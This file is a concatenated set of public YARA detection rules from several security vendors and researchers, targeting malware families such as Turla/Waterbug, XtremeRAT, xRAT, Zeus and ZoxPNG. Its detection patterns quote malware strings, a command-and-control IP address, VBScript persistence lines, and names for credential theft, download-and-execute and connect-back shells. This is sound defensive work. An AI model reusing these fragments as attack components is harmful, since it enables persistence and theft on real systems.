    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule WaterBug_wipbot_2013_core_PDF {
	meta:
		description = "Symantec Waterbug Attack - Trojan.Wipbot 2014 core PDF"
		author = "Symantec Security Response"
		date = "22.01.2015"
		reference = "http://t.co/rF35OaAXrl"
	strings:
		$PDF = "%PDF-"
		$a = /\+[A-Za-z]{1}\. _ _ \$\+[A-Za-z]{1}\. _ \$ _ \+/ 
		$b = /\+[A-Za-z]{1}\.\$\$\$ _ \+/
	condition:
		($PDF at 0) and #a > 150 and #b > 200
}

rule WaterBug_wipbot_2013_dll {
	meta:
		description = "Symantec Waterbug Attack - Trojan.Wipbot 2014 Down.dll component"
		author = "Symantec Security Response"
		date = "22.01.2015"
		reference = "http://t.co/rF35OaAXrl"		
	strings:
		$string1 = "/%s?rank=%s"
		$string2 = "ModuleStart\x00ModuleStop\x00start"
		$string3 = "1156fd22-3443-4344-c4ffff"
		//read file... error..
		$string4 = "read\x20file\x2E\x2E\x2E\x20error\x00\x00"
	condition:
		2 of them
}

rule WaterBug_wipbot_2013_core {
	meta:
		description = "Symantec Waterbug Attack - Trojan.Wipbot core + core; garbage appended data (PDF Exploit leftovers) + wipbot dropper; fake AdobeRd32 Error"
		author = "Symantec Security Response"
		date = "22.01.2015"
		reference = "http://t.co/rF35OaAXrl"			
	strings:
		$mz = "MZ"
		$code1 = { 89 47 0C C7 47 10 90 C2 04 00 C7 47 14 90 C2 10 00 C7 47 18 90 90 60 68 89 4F 1C C7 47 20 90 90 90 B8 89 4F 24 C7 47 28 90 FF D0 61 C7 47 2C 90 C2 04 00}
		$code2 = { 85 C0 75 25 8B 0B BF ?? ?? ?? ?? EB 17 69 D7 0D 66 19 00 8D BA 5F F3 6E 3C 89 FE C1 EE 10 89 F2 30 14 01 40 3B 43 04 72 E4}
		$code3 = {90 90 90 ?? B9 00 4D 5A 90 00 03 00 00 00 82 04} $code4 = {55 89 E5 5D C3 55 89 E5 83 EC 18 8B 45 08 85 C0}
	condition:
		$mz at 0 and (($code1 or $code2) or ($code3 and $code4))
}

rule WaterBug_turla_dropper {
	meta:
		description = "Symantec Waterbug Attack - Trojan Turla Dropper"
		author = "Symantec Security Response"
		date = "22.01.2015"
		reference = "http://t.co/rF35OaAXrl"
	strings: 
		$a = {0F 31 14 31 20 31 3C 31 85 31 8C 31 A8 31 B1 31 D1 31 8B 32 91 32 B6 32 C4 32 6C 33 AC 33 10 34}
		$b = {48 41 4C 2E 64 6C 6C 00 6E 74 64 6C 6C 00 00 00 57 8B F9 8B 0D ?? ?? ?? ?? ?? C9 75 26 56 0F 20 C6 8B C6 25 FF FF FE FF 0F 22 C0 E8}
	condition: 
		all of them
}

rule WaterBug_fa_malware { 
	meta: 
		description = "Symantec Waterbug Attack - FA malware variant"
		author = "Symantec Security Response"
		date = "22.01.2015"
		reference = "http://t.co/rF35OaAXrl"
	strings:
		$mz = "MZ"
		$string1 = "C:\\proj\\drivers\\fa _ 2009\\objfre\\i386\\atmarpd.pdb"
		$string2 = "d:\\proj\\cn\\fa64\\"
		$string3 = "sengoku_Win32.sys\x00"
		$string4 = "rk_ntsystem.c"
		$string5 = "\\uroboros\\"
		$string6 = "shell.{F21EDC09-85D3-4eb9-915F-1AFA2FF28153}"
	condition:
		($mz at 0) and (any of ($string*))
}


rule WaterBug_sav {
	meta: 
		description = "Symantec Waterbug Attack - SAV Malware"
		author = "Symantec Security Response"
		date = "22.01.2015"
		reference = "http://t.co/rF35OaAXrl" 	
	strings:
		$mz = "MZ"
		$code1a = { 8B 75 18 31 34 81 40 3B C2 72 F5 33 F6 39 7D 14 76 1B 8A 04 0E 88 04 0F 6A 0F 33 D2 8B C7 5B F7 F3 85 D2 75 01 }
		$code1b = { 8B 45 F8 40 89 45 F8 8B 45 10 C1 E8 02 39 45 F8 73 17 8B 45 F8 8B 4D F4 8B 04 81 33 45 20 8B 4D F8 8B 55 F4 89 04 8A EB D7 83 65 F8 00 83 65 EC 00 EB 0E 8B 45 F8 40 89 45 F8 8B 45 EC 40 89 45 EC 8B 45 EC	3B 45 10 73 27 8B 45 F4 03 45 F8 8B 4D F4 03 4D EC 8A 09 88 08 8B 45 F8 33 D2 6A 0F 59 F7 F1 85 D2 75 07 }
		$code1c = { 8A 04 0F 88 04 0E 6A 0F 33 D2 8B C6 5B F7 F3 85 D2 75 01 47 8B 45 14 46 47 3B F8 72 E3 EB 04 C6 04 08 00 48 3B C6 73 F7 33 C0 C1 EE 02 74 0B 8B 55 18 31 14 81 40 3B C6 72 F5 }
		$code2 =  { 29 5D 0C 8B D1 C1 EA 05 2B CA 8B 55 F4 2B C3 3D 00 00 00 01 89 0F 8B 4D 10 8D 94 91 00 03 00 00 73 17 8B 7D F8 8B 4D 0C 0F B6 3F C1 E1 08 0B CF C1 E0 08 FF 45 F8 89 4D 0C 8B 0A 8B F8 C1 EF 0B}
	condition:
		($mz at 0) and (($code1a or $code1b or $code1c) and $code2) 
}

/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule WimmieShellcode : Wimmie Family 
{
    meta:
        description = "Wimmie code features"
        author = "Seth Hardy"
        last_modified = "2014-07-17"
        
    strings:
        // decryption loop
        $ = { 49 30 24 39 83 F9 00 77 F7 8D 3D 4D 10 40 00 B9 0C 03 00 00 }
        $xordecrypt = {B9 B4 1D 00 00 [8] 49 30 24 39 83 F9 00 }
        
    condition:
        any of them
}

rule WimmieStrings : Wimmie Family
{
    meta:
        description = "Strings used by Wimmie"
        author = "Seth Hardy"
        last_modified = "2014-07-17"
        
    strings:
        $ = "\x00ScriptMan"
        $ = "C:\\WINDOWS\\system32\\sysprep\\cryptbase.dll" wide ascii
        $ = "ProbeScriptFint" wide ascii
        $ = "ProbeScriptKids"
        
    condition:
        any of them

}

rule Wimmie : Family
{
    meta:
        description = "Wimmie family"
        author = "Seth Hardy"
        last_modified = "2014-07-17"
   
    condition:
        WimmieShellcode or WimmieStrings
        
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

rule Win32_Buzus_Softpulse {
	meta:
		description = "Trojan Buzus / Softpulse"
		author = "Florian Roth"
		date = "2015-05-13"
		hash = "2f6df200e63a86768471399a74180466d2e99ea9"
		score = 75
	strings:
		$x1 = "pi4izd6vp0.com" fullword ascii

		$s1 = "SELECT * FROM Win32_Process" fullword wide
		$s4 = "CurrentVersion\\Uninstall\\avast" fullword wide
		$s5 = "Find_RepeatProcess" fullword ascii
		$s6 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\" fullword wide
		$s7 = "myapp.exe" fullword ascii
		$s14 = "/c ping -n 1 www.google" wide
	condition:
		uint16(0) == 0x5a4d and 
			( 
				( $x1 and 2 of ($s*) ) or
				all of ($s*) 
			)
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

// Operation Windigo yara rules
// For feedback or questions contact us at: windigo@eset.sk
// https://github.com/eset/malware-ioc/
//
// These yara rules are provided to the community under the two-clause BSD
// license as follows:
//
// Copyright (c) 2014, ESET
// All rights reserved.
//
// Redistribution and use in source and binary forms, with or without
// modification, are permitted provided that the following conditions are met:
//
// 1. Redistributions of source code must retain the above copyright notice, this
// list of conditions and the following disclaimer.
//
// 2. Redistributions in binary form must reproduce the above copyright notice,
// this list of conditions and the following disclaimer in the documentation
// and/or other materials provided with the distribution.
//
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
// AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
// IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
// DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
// FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
// DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
// SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
// CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
// OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
// OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
//
rule onimiki
{
  meta:
    description = "Linux/Onimiki malicious DNS server"
    malware = "Linux/Onimiki"
    operation = "Windigo"
    author = "Olivier Bilodeau <bilodeau@eset.com>"
    created = "2014-02-06"
    reference = "http://www.welivesecurity.com/wp-content/uploads/2014/03/operation_windigo.pdf"
    contact = "windigo@eset.sk"
    source = "https://github.com/eset/malware-ioc/"
    license = "BSD 2-Clause"

  strings:
    // code from offset: 0x46CBCD
    $a1 = {43 0F B6 74 2A 0E 43 0F  B6 0C 2A 8D 7C 3D 00 8D}
    $a2 = {74 35 00 8D 4C 0D 00 89  F8 41 F7 E3 89 F8 29 D0}
    $a3 = {D1 E8 01 C2 89 F0 C1 EA  04 44 8D 0C 92 46 8D 0C}
    $a4 = {8A 41 F7 E3 89 F0 44 29  CF 29 D0 D1 E8 01 C2 89}
    $a5 = {C8 C1 EA 04 44 8D 04 92  46 8D 04 82 41 F7 E3 89}
    $a6 = {C8 44 29 C6 29 D0 D1 E8  01 C2 C1 EA 04 8D 04 92}
    $a7 = {8D 04 82 29 C1 42 0F B6  04 21 42 88 84 14 C0 01}
    $a8 = {00 00 42 0F B6 04 27 43  88 04 32 42 0F B6 04 26}
    $a9 = {42 88 84 14 A0 01 00 00  49 83 C2 01 49 83 FA 07}

  condition:
    all of them
}
rule wineggdrop : portscanner
{
    meta:
        author = "Christian Rebischke (@sh1bumi)"
        date = "2015-09-05"
        description = "Rules for TCP Portscanner VX.X by WinEggDrop"
        in_the_wild = true
        family = "Hackingtool/Portscanner"

    strings:
        $a = { 54 43 50 20 50 6f 72 74 20 53 63 61 6e 6e 65 72 
               20 56 3? 2e 3? 20 42 79 20 57 69 6e 45 67 67 44 
               72 6f 70 0a } 
        $b = "Result.txt"
        $c = "Usage:   %s TCP/SYN StartIP [EndIP] Ports [Threads] [/T(N)] [/(H)Banner] [/Save]\n"

    condition:
        //check for MZ Signature at offset 0
        uint16(0) == 0x5A4D

        and

        //check for wineggdrop specific strings
        $a and $b and $c 
}

/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"


rule WoolenGoldfish_Sample_1 {
	meta:
		description = "Detects a operation Woolen-Goldfish sample - http://goo.gl/NpJpVZ"
		author = "Florian Roth"
		reference = "http://goo.gl/NpJpVZ"
		date = "2015/03/25"
		score = 60
		hash = "7ad0eb113bc575363a058f4bf21dbab8c8f7073a"
	strings:
		$s1 = "Cannot execute (%d)" fullword ascii
		$s16 = "SvcName" fullword ascii
	condition:
		all of them
}

rule WoolenGoldfish_Generic_1 {
	meta:
		description = "Detects a operation Woolen-Goldfish sample - http://goo.gl/NpJpVZ"
		author = "Florian Roth"
		reference = "http://goo.gl/NpJpVZ"
		date = "2015/03/25"
		score = 90
		super_rule = 1
		hash0 = "5d334e0cb4ff58859e91f9e7f1c451ffdc7544c3"
		hash1 = "d5b2b30fe2d4759c199e3659d561a50f88a7fb2e"
		hash2 = "a42f1ad2360833baedd2d5f59354c4fc3820c475"
	strings:
		$x0 = "Users\\Wool3n.H4t\\"
		$x1 = "C-CPP\\CWoolger"
		$x2 = "NTSuser.exe" fullword wide

		$s1 = "107.6.181.116" fullword wide
		$s2 = "oShellLink.Hotkey = \"CTRL+SHIFT+F\"" fullword
		$s3 = "set WshShell = WScript.CreateObject(\"WScript.Shell\")" fullword
		$s4 = "oShellLink.IconLocation = \"notepad.exe, 0\"" fullword
		$s5 = "set oShellLink = WshShell.CreateShortcut(strSTUP & \"\\WinDefender.lnk\")" fullword
		$s6 = "wlg.dat" fullword
		$s7 = "woolger" fullword wide
		$s8 = "[Enter]" fullword
		$s9 = "[Control]" fullword
	condition:
		( 1 of ($x*) and 2 of ($s*) ) or
		( 6 of ($s*) )
}

rule WoolenGoldfish_Generic_2 {
	meta:
		description = "Detects a operation Woolen-Goldfish sample - http://goo.gl/NpJpVZ"
		author = "Florian Roth"
		reference = "http://goo.gl/NpJpVZ"
		date = "2015/03/25"
		score = 90
		hash1 = "47b1c9caabe3ae681934a33cd6f3a1b311fd7f9f"
		hash2 = "62172eee1a4591bde2658175dd5b8652d5aead2a"
		hash3 = "7fef48e1303e40110798dfec929ad88f1ad4fbd8"
		hash4 = "c1edf6e3a271cf06030cc46cbd90074488c05564"
	strings:
		$s0 = "modules\\exploits\\littletools\\agent_wrapper\\release" ascii
	condition:
		all of them
}

rule WoolenGoldfish_Generic_3 {
	meta:
		description = "Detects a operation Woolen-Goldfish sample - http://goo.gl/NpJpVZ"
		author = "Florian Roth"
		reference = "http://goo.gl/NpJpVZ"
		date = "2015/03/25"
		score = 90
		hash1 = "86222ef166474e53f1eb6d7e6701713834e6fee7"
		hash2 = "e8dbcde49c7f760165ebb0cb3452e4f1c24981f5"
	strings:
		$x1 = "... get header FATAL ERROR !!!  %d bytes read > header_size" fullword ascii
		$x2 = "index.php?c=%S&r=%x&u=1&t=%S" fullword wide
		$x3 = "connect_back_tcp_channel#do_connect:: Error resolving connect back hostname" fullword ascii

		$s0 = "kernel32.dll GetProcAddressLoadLibmalware_raryAws2_32.dll" fullword ascii
		$s1 = "Content-Type: multipart/form-data; boundary=%S" fullword wide
		$s2 = "Attempting to unlock uninitialized lock!" fullword ascii
		$s4 = "unable to load kernel32.dll" fullword ascii
		$s5 = "index.php?c=%S&r=%x" fullword wide
		$s6 = "%s len:%d " fullword ascii
		$s7 = "Encountered error sending syscall response to client" fullword ascii
		$s9 = "/info.dat" fullword ascii
		$s10 = "Error entering thread lock" fullword ascii
		$s11 = "Error exiting thread lock" fullword ascii
		$s12 = "connect_back_tcp_channel_init:: socket() failed" fullword ascii
	condition:
		( 1 of ($x*) ) or
		( 8 of ($s*) )
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

rule XOR_DDosv1 : DDoS
{
  meta:
    author = "Akamai CSIRT"
    description = "Rule to detect XOR DDos infection"
  strings:
    $st0 = "BB2FA36AAA9541F0"
    $st1 = "md5="
    $st2 = "denyip="
    $st3 = "filename="
    $st4 = "rmfile="
    $st5 = "exec_packet"
    $st6 = "build_iphdr"
  condition:
    all of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/
rule xRAT20
{
meta:
	author = "Rottweiler"
	date = "2015-08-20"
	description = "Identifies xRAT 2.0 samples"
	maltype = "Remote Access Trojan"
	hash0 = "cda610f9cba6b6242ebce9f31faf5d9c"
	hash1 = "60d7b0d2dfe937ac6478807aa7043525"
	hash2 = "d1b577fbfd25cc5b873b202cfe61b5b8"
	hash3 = "1820fa722906569e3f209d1dab3d1360"
	hash4 = "8993b85f5c138b0afacc3ff04a2d7871"
	hash5 = "0c231ed8a800b0f17f897241f1d5f4e3"
	hash1 = "60d7b0d2dfe937ac6478807aa7043525"
	hash8 = "2c198e3e0e299a51e5d955bb83c62a5e"
	sample_filetype = "exe"
	yaragenerator = "https://github.com/Xen0ph0n/YaraGenerator"
strings:
	$string0 = "GetDirectory: File not found" wide
	$string1 = "<>m__Finally8"
	$string2 = "Secure"
	$string3 = "ReverseProxyClient"
	$string4 = "DriveDisplayName"
	$string5 = "<IsError>k__BackingField"
	$string6 = "set_InstallPath"
	$string7 = "memcmp"
	$string8 = "urlHistory"
	$string9 = "set_AllowAutoRedirect"
	$string10 = "lpInitData"
	$string11 = "reader"
	$string12 = "<FromRawDataGlobal>d__f"
	$string13 = "mq.png" wide
	$string14 = "remove_KeyDown"
	$string15 = "ProtectedData"
	$string16 = "m_hotkeys"
	$string17 = "get_Hour"
	$string18 = "\\mozglue.dll" wide
condition:
	18 of them
}
rule xRAT
{
    meta:
        author = " Kevin Breen <kevin@techanarchy.net>"
        date = "2014/04"
        ref = "http://malwareconfig.com/stats/xRat"
        maltype = "Remote Access Trojan"
        filetype = "exe"

    strings:
        $v1a = "DecodeProductKey"
        $v1b = "StartHTTPFlood"
        $v1c = "CodeKey"
        $v1d = "MESSAGEBOX"
        $v1e = "GetFilezillaPasswords"
        $v1f = "DataIn"
        $v1g = "UDPzSockets"
        $v1h = {52 00 54 00 5F 00 52 00 43 00 44 00 41 00 54 00 41}

        $v2a = "<URL>k__BackingField"
        $v2b = "<RunHidden>k__BackingField"
        $v2c = "DownloadAndExecute"
        $v2d = "-CHECK & PING -n 2 127.0.0.1 & EXIT" wide
        $v2e = "england.png" wide
        $v2f = "Showed Messagebox" wide
    condition:
        all of ($v1*) or all of ($v2*)
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule Xtreme
{
    meta:
        description = "Xtreme RAT"
	author = "botherder https://github.com/botherder"

    strings:
        $string1 = /(X)tremeKeylogger/ wide ascii
        $string2 = /(X)tremeRAT/ wide ascii
        $string3 = /(X)TREMEUPDATE/ wide ascii
        $string4 = /(S)TUBXTREMEINJECTED/ wide ascii

        $unit1 = /(U)nitConfigs/ wide ascii
        $unit2 = /(U)nitGetServer/ wide ascii
        $unit3 = /(U)nitKeylogger/ wide ascii
        $unit4 = /(U)nitCryptString/ wide ascii
        $unit5 = /(U)nitInstallServer/ wide ascii
        $unit6 = /(U)nitInjectServer/ wide ascii
        $unit7 = /(U)nitBinder/ wide ascii
        $unit8 = /(U)nitInjectProcess/ wide ascii

    condition:
        5 of them
}

rule xtreme_rat : Trojan
{
	meta:
		author="Kevin Falcoz"
		date="23/02/2013"
		description="Xtreme RAT"
	
	strings:
		$signature1={58 00 54 00 52 00 45 00 4D 00 45} /*X.T.R.E.M.E*/
		
	condition:
		$signature1
}

rule XtremeRATCode : XtremeRAT Family 
{
    meta:
        description = "XtremeRAT code features"
        author = "Seth Hardy"
        last_modified = "2014-07-09"
    
    strings:
        // call; fstp st
        $ = { E8 ?? ?? ?? ?? DD D8 }
        // hiding string
        $ = { C6 85 ?? ?? ?? ?? 4D C6 85 ?? ?? ?? ?? 70 C6 85 ?? ?? ?? ?? 64 C6 85 ?? ?? ?? ?? 62 C6 85 ?? ?? ?? ?? 6D }
    
    condition:
        all of them
}

rule XtremeRATStrings : XtremeRAT Family
{
    meta:
        description = "XtremeRAT Identifying Strings"
        author = "Seth Hardy"
        last_modified = "2014-07-09"
        
    strings:
        $ = "dqsaazere"
        $ = "-GCCLIBCYGMING-EH-TDM1-SJLJ-GTHR-MINGW32"
        
    condition:
       any of them
}

rule XtremeRAT : Family
{
    meta:
        description = "XtremeRAT"
        author = "Seth Hardy"
        last_modified = "2014-07-09"
        
    condition:
        XtremeRATCode or XtremeRATStrings
}

rule xtremrat : rat
{
	meta:
		author = "Jean-Philippe Teissier / @Jipe_"
		description = "Xtrem RAT v3.5"
		date = "2012-07-12" 
		version = "1.0" 
		filetype = "memory"

	strings:
		$a = "XTREME" wide
		$b = "XTREMEBINDER" wide
		$c = "STARTSERVERBUFFER" wide
		$d = "SOFTWARE\\XtremeRAT" wide
		$e = "XTREMEUPDATE" wide
		$f = "XtremeKeylogger" wide
		$g = "myversion|3.5" wide
		$h = "xtreme rat" wide nocase
	condition:
		2 of them
}


/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule YayihCode : Yayih Family 
{
    meta:
        description = "Yayih code features"
        author = "Seth Hardy"
        last_modified = "2014-07-11"
    
    strings:
        //  encryption
        $ = { 80 04 08 7A 03 C1 8B 45 FC 80 34 08 19 03 C1 41 3B 0A 7C E9 }
    
    condition:
        any of them
}

rule YayihStrings : Yayih Family
{
    meta:
        description = "Yayih Identifying Strings"
        author = "Seth Hardy"
        last_modified = "2014-07-11"
        
    strings:
        $ = "/bbs/info.asp"
        $ = "\\msinfo.exe"
        $ = "%s\\%srcs.pdf"
        $ = "\\aumLib.ini"

    condition:
       any of them
}

rule Yayih : Family
{
    meta:
        description = "Yayih"
        author = "Seth Hardy"
        last_modified = "2014-07-11"
        
    condition:
        YayihCode or YayihStrings
}

/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule Zegost : Trojan
{
	meta:
		author="Kevin Falcoz"
		date="10/06/2013"
		description="Zegost Trojan"
		
	strings:
		$signature1={39 2F 66 33 30 4C 69 35 75 62 4F 35 44 4E 41 44 44 78 47 38 73 37 36 32 74 71 59 3D}
		$signature2={00 BA DA 22 51 42 6F 6D 65 00}
		
	condition:
		$signature1 and $signature2
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule Windows_Malware : Zeus_1134
    {
            meta:
                    author = "Xylitol xylitol@malwareint.com"
                    date = "2014-03-03"
                    description = "Match first two bytes, protocol and string present in Zeus 1.1.3.4"
                    reference = "http://www.xylibox.com/2014/03/zeus-1134.html"
                    
            strings:
                    $mz = {4D 5A}
                    $protocol1 = "X_ID: "
                    $protocol2 = "X_OS: "
                    $protocol3 = "X_BV: "
                    $stringR1 = "InitializeSecurityDescriptor"
                    $stringR2 = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1)"
            condition:
                    ($mz at 0 and all of ($protocol*) and ($stringR1 or $stringR2))
    }
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as long as you use it under this license.

*/

import "pe"

rule zoxPNG_RAT
{
    meta:
        Author      = "Novetta Advanced Research Group"
        Date        = "2014/11/14"
        Description = "ZoxPNG RAT, url inside"
        Reference   = "http://www.novetta.com/wp-content/uploads/2014/11/ZoxPNG.pdf"

    strings: 
        $url = "png&w=800&h=600&ei=CnJcUcSBL4rFkQX444HYCw&zoom=1&ved=1t:3588,r:1,s:0,i:92&iact=rc&dur=368&page=1&tbnh=184&tbnw=259&start=0&ndsp=20&tx=114&ty=58"

    condition: 
        $url
}